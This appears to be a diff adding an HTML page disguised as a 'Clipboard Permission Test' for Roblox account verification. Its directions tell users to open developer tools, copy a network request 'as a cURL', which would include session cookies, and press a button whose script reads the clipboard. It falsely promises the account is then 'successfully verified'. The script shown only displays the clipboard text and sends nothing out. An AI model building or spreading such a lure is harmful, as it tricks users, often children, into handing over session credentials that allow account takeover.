@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Clipboard Permission Test</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    h1 { margin-bottom: 10px; }
+    p { margin: 10px 0; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    #output { margin-top: 20px; font-size: 18px; color: darkblue; }
+  </style>
+</head>
+<body>
+  <h1>Clipboard Permission Test</h1>
+  
+  <!-- 🔽 You can write a description here -->
+  <p id="description">[Copy this strand and press the button below to verify your clipboard works: IDVERIFYTEST]</p>
+
+  <button id="readBtn">Verify</button>
+  
+  <!-- 🔽 You can write extra directions here -->
+  <p id="directions">[Next, go to https://roblox.com/RoVerIDVERIFY and open the developer menu (ctrl + shift + I), and go to the "Network" Tab. Next, reload the page with the console open, and you will see a line highlighted red, saying "RoVer ID Verify". Right click on it, and choose copy, and copy as a cURL. After this step, your account has been successfuly verified.]</p>
+
+  <div id="output"></div>
+
+  <script>
+    const btn = document.getElementById("readBtn");
+    const output = document.getElementById("output");
+
+    btn.addEventListener("click", async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        output.textContent = "Clipboard contains: " + text;
+      } catch (err) {
+        output.textContent = "Failed: " + err.message;
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
